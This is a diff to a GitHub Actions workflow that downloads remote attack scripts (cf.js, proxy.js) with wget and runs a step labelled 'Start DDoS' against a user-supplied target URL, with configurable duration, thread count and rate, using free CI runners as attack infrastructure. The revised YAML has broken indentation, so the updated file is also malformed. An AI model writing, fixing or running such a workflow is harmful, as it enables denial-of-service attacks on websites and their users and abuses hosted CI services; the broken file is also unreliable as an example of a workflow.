@@ -1,41 +1,51 @@
 name: cf
-
 on:
   workflow_dispatch:
     inputs:
       target:
         required: true
+        type: string
       time:
+        description: 'Thời gian tấn công (giây)'
+        required: true
         default: '300'
+        type: string
       threads:
         default: '20'
+        type: string
       rate:
         default: '90'
+        type: string
 
 jobs:
   attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 300
     steps:
       - uses: actions/setup-node@v4
-        with: { node-version: 20 }
-      - uses: actions/setup-python@v5
-        with: { python-version: '3.11' }
+      with:
+        node-version: 20
 
-      - name: Download tools
-        run: |
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
-          chmod +x *
+ - uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
 
-      - name: modunle and proxy
-        run: |
-          npm install hpack cluster
-          node proxy.js
+ - name: Download tools
+      run: |
+        wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
+        wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
+        chmod +x *
 
-      - name: start ddos
-        run: |
-          node cf.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt --full --cache --debug
+ - name: Install modules & run proxy
+      run: |
+        npm install hpack cluster
+        node proxy.js
 
-      - name: Keep alive
-        run: sleep 21600
+ - name: Start DDoS
+      run: |
+        node cf.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt --full --cache --debug
+
+ - name: Keep workflow alive = attack time
+      run: |
+        echo "Keeping workflow alive for ${{ inputs.time }} seconds..."
+        sleep ${{ inputs.time }}
